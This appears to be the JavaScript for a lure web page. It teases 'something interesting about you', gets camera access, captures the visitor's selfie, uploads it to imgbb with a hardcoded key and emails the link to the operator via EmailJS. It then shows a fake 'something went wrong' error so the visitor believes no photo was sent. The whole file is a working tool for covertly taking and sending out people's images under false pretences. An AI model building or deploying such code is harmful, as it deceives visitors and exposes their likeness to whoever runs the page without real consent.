emailjs.init("7VCFhr-NnUB1KWuE5");

const tapBtn = document.getElementById('tapBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const okReadyBtn = document.getElementById('okReadyBtn');
const cancelBtn = document.getElementById('cancelBtn');
const cameraContainer = document.getElementById('cameraContainer');
const hiddenText = document.getElementById('hiddenText');
const countdownEl = document.getElementById('countdown');
const photoContainer = document.getElementById('photoContainer');

let stream = null;
let lastCapturedImage = null;
let countdownInterval = null;
let countdownValue = 10;
let countdownStopped = false;

const line1Text = "Here is something interesting";
const line2Text = "about you";

async function typeText(text, element, speed = 40) {
  let i = 0;
  element.textContent = '';
  return new Promise((resolve) => {
    const interval = setInterval(() => {
      element.textContent += text.charAt(i);
      i++;
      if (i === text.length) {
        clearInterval(interval);
        resolve();
      }
    }, speed);
  });
}

async function startTypingAnimation() {
  await typeText(line1Text, document.getElementById('typingLine1'), 40);
  await typeText(line2Text, document.getElementById('typingLine2'), 40);
  tapBtn.style.display = 'inline-block';
}

startTypingAnimation();

hiddenText.style.display = 'none';
okReadyBtn.style.display = 'none';
countdownEl.style.display = 'none';
photoContainer.style.display = 'none';
cameraContainer.style.display = 'none';

tapBtn.onclick = async () => {
  tapBtn.style.display = 'none';

  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    video.srcObject = stream;

    // Wait for video metadata to load to get proper video dimensions
    await new Promise((resolve) => {
      if (video.readyState >= 2) resolve();
      else video.onloadedmetadata = () => resolve();
    });

    hiddenText.style.display = 'block';
    okReadyBtn.style.display = 'inline-block';
    cameraContainer.style.display = 'flex'; // Show preview at bottom
  } catch (e) {
    alert('Camera permission denied. Please grant access.');
    tapBtn.style.display = 'inline-block';
  }
};

okReadyBtn.onclick = async () => {
  okReadyBtn.style.display = 'none';
  hiddenText.style.display = 'none';

  countdownValue = 10;
  countdownStopped = false;
  countdownEl.style.display = 'block';
  countdownEl.textContent = countdownValue;

  countdownInterval = setInterval(() => {
    countdownValue--;
    if (countdownValue > 0 && !countdownStopped) {
      countdownEl.textContent = countdownValue;
    } else {
      clearInterval(countdownInterval);
      if (!countdownStopped) {
        countdownEl.style.display = 'none';
        showErrorAndReset();
      }
    }
  }, 1000);

  // Capture image and send email
  lastCapturedImage = captureImage();

  await stopCamera();
  photoContainer.style.display = 'block';

  try {
    await uploadAndSend(lastCapturedImage);
    countdownStopped = true;
    clearInterval(countdownInterval);
    countdownEl.style.display = 'none';
    showErrorAndReset();
  } catch (err) {
    console.error("Upload or Email send error:", err);
    countdownStopped = true;
    clearInterval(countdownInterval);
    countdownEl.style.display = 'none';
    showErrorAndReset();
  }
};

function captureImage() {
  const width = video.videoWidth || 320;
  const height = video.videoHeight || 240;

  canvas.width = width;
  canvas.height = height;

  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, width, height);

  return canvas.toDataURL('image/jpeg', 1.0);
}

async function stopCamera() {
  if (stream) {
    stream.getTracks().forEach(t => t.stop());
    stream = null;
  }
  cameraContainer.style.display = 'none';
}

cancelBtn.onclick = () => {
  photoContainer.style.display = 'none';
  resetToStart();
};

function resetToStart() {
  document.getElementById('typingLine1').textContent = '';
  document.getElementById('typingLine2').textContent = '';
  countdownEl.style.display = 'none';
  photoContainer.style.display = 'none';
  tapBtn.style.display = 'inline-block';
  hiddenText.style.display = 'none';
  okReadyBtn.style.display = 'none';
  stopCamera();
  startTypingAnimation();
}

function showErrorAndReset() {
  alert("Sorry something went wrong. Try again.");
  resetToStart();
}

async function uploadAndSend(imageData) {
  try {
    console.log("Starting upload...");
    const base64Data = imageData.split(',')[1];
    const formData = new FormData();
    formData.append("key", "c0d9ac729a5860cfdd90815c8267dc08");
    formData.append("image", base64Data);

    const response = await fetch("https://api.imgbb.com/1/upload", {
      method: "POST",
      body: formData
    });

    const result = await response.json();
    console.log("Upload result:", result);
    if (!result.success) throw new Error("ImgBB upload failed");

    const imageUrl = result.data.url;
    console.log("Image URL:", imageUrl);

    const emailResponse = await emailjs.send("service_w96kc97", "template_vgccyhd", {
      name: "Friend",
      message: "Here is the surprise photo!",
      photo: imageUrl
    });

    console.log("Email sent:", emailResponse);
  } catch (err) {
    console.error("Upload or EmailJS error:", err);
    throw err;
  }
}
